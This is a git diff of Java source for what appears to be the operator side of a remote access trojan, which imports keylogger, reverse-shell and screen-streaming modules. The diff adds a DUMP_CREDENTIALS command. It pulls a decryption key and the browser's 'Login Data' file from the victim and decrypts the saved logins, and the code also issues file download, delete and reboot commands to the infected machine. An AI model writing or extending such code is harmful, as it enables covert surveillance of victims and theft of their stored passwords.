@@ -1,7 +1,9 @@
 package Connections;
 
 
-import GUI.TableUtils.Connection.Connection;
+import GUI.TableUtils.Connection.ConnectionEnum;
+import GUI.TableUtils.CrendentialsDumper.Credentials;
+import GUI.TableUtils.CrendentialsDumper.CredentialsDumper;
 import GUI.TableUtils.KeyLogger.KeyloggerEvents;
 import GUI.TableUtils.Permissions.Permissions;
 import GUI.TableUtils.ReverseShell.Shell;
@@ -9,20 +11,32 @@ import GUI.TableUtils.ScreenStreaming.Screen;
 import GUI.TableUtils.SystemState.State;
 import Information.*;
 
+import java.util.Date;
+
+
 import Information.Action;
-import com.formdev.flatlaf.json.Json;
 import org.json.JSONObject;
 
 
+import javax.crypto.*;
+import javax.crypto.spec.GCMParameterSpec;
+import javax.crypto.spec.SecretKeySpec;
 import javax.swing.*;
 import java.io.*;
 import java.net.Socket;
+import java.nio.charset.StandardCharsets;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.sql.DriverManager;
+import java.sql.ResultSet;
+import java.sql.SQLException;
+import java.sql.Statement;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.List;
 import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
-
 
 public class Streams {
 
@@ -122,7 +136,7 @@ public class Streams {
 
     private SystemInformation listToSystemInformation(List<String> list) {
         return new SystemInformation(list.get(0), list.get(1), list.get(2), list.get(3),
-                list.get(4), list.get(5), list.get(6),Boolean.parseBoolean(list.get(7)),Boolean.parseBoolean(list.get(8)));
+                list.get(4), list.get(5), list.get(6), Boolean.parseBoolean(list.get(7)), Boolean.parseBoolean(list.get(8)));
     }
 
     private NetworkInformation listToNetworkInformation(String jsonString) {
@@ -170,9 +184,21 @@ public class Streams {
                 return readList();
             }
 
+
         }
         return null;
     }
+
+    public byte[] receiveBytesForCryptography() throws IOException {
+        int size = mainStream.readSize();
+        byte[] buffer = new byte[size];
+        dis.readFully(buffer);
+        return buffer;
+    }
+
+
+
+
 
     public void sendAction(Action action, String destinationPath, int numOfFiles) throws IOException {
         JSONObject jsonObject = new JSONObject();
@@ -226,6 +252,19 @@ public class Streams {
         return null;
     }
 
+    public List<Credentials> getCredentials(Action action, String command) throws IOException {
+        JSONObject jsonObject = new JSONObject();
+        switch (action) {
+            case DUMP_CREDENTIALS -> {
+                jsonObject.put("action", 15);
+                mainStream.sendString(jsonObject.toString());
+                byte[] array = receiveBytesForCryptography();
+                receiveFile(command);
+                return new CredentialsDumper().getListOfCredentials(array, command + "/" + "Login Data");
+            }
+        }
+        return null;
+    }
     public void sendAction(Action action, String command) throws IOException {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
@@ -261,12 +300,12 @@ public class Streams {
         JSONObject jsonObject = new JSONObject();
         switch (action) {
             case DOWNLOAD -> {
-                jsonObject.put("action",5);
+                jsonObject.put("action", 5);
                 jsonObject.put("file_list", fileList);
                 mainStream.sendString(jsonObject.toString());
             }
             case DELETE -> {
-                jsonObject.put("action",8);
+                jsonObject.put("action", 8);
                 jsonObject.put("file_list", fileList);
                 mainStream.sendString(jsonObject.toString());
             }
@@ -284,7 +323,7 @@ public class Streams {
             case DUMP_LAST -> {
                 jsonObject.put("action", 4);
                 mainStream.sendString(jsonObject.toString());
-                if (readSize()!=-1) {
+                if (readSize() != -1) {
                     receiveFile(nameOfSession);
                     FolderOpener.open(nameOfSession);
                 } else {
@@ -294,7 +333,7 @@ public class Streams {
             case DUMP_ALL -> {
                 jsonObject.put("action", 14);
                 mainStream.sendString(jsonObject.toString());
-                if (readSize()!=-1) {
+                if (readSize() != -1) {
                     receiveLogs(nameOfSession);
                     FolderOpener.open(nameOfSession);
                 } else {
@@ -304,13 +343,13 @@ public class Streams {
         }
     }
 
-    private void noLogsToDownload (){
+    private void noLogsToDownload() {
         SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "There are no logs to download!",
                 "Keylogger error", JOptionPane.ERROR_MESSAGE));
     }
 
     private void receiveLogs(String nameOfSession) throws IOException {
-        while (readSize()!=-1){
+        while (readSize() != -1) {
             receiveFile(nameOfSession);
             sendSize(0);
         }
@@ -338,7 +377,7 @@ public class Streams {
     }
 
 
-    public void sendAction(Connection action) throws IOException {
+    public void sendAction(ConnectionEnum action) throws IOException {
         switch (action) {
             case RESTART -> sendSize(-1);
             case DISCONNECT -> sendSize(-2);
@@ -353,7 +392,6 @@ public class Streams {
             case REBOOT -> sendSize(25);
         }
     }
-
 
 
     public void sendList(List<String> fileList) throws IOException {
